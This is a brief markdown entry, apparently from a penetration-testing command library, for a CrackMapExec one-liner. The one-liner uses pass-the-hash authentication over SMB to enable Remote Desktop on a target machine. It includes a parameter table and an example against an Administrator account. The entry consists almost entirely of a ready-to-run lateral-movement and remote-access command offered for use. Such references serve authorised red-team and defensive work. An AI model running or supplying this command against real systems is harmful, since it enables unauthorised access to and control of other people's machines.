---
type: command
executor: bash
data: cme smb $_TARGET -u $_USER -H $_HASH -M rdp -o ACTION=enable
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - smb
  - rdp
verified: true
validated: true
---

# cme-smb-enable-rdp

## Command

```bash
cme smb $_TARGET -u $_USER -H $_HASH -M rdp -o ACTION=enable
```

## Description

Enables RDP on target via SMB.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target IP | Yes |
| -u $_USER | User | Yes |
| -H $_HASH | Hash | Yes |
| -M rdp | RDP module | Yes |
| -o ACTION=enable | Enable action | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.100 -u Administrator -H aad3... -M rdp -o ACTION=enable
```

## Expected Output

"RDP enabled successfully".

## Related

- [[tools/CrackMapExec]]
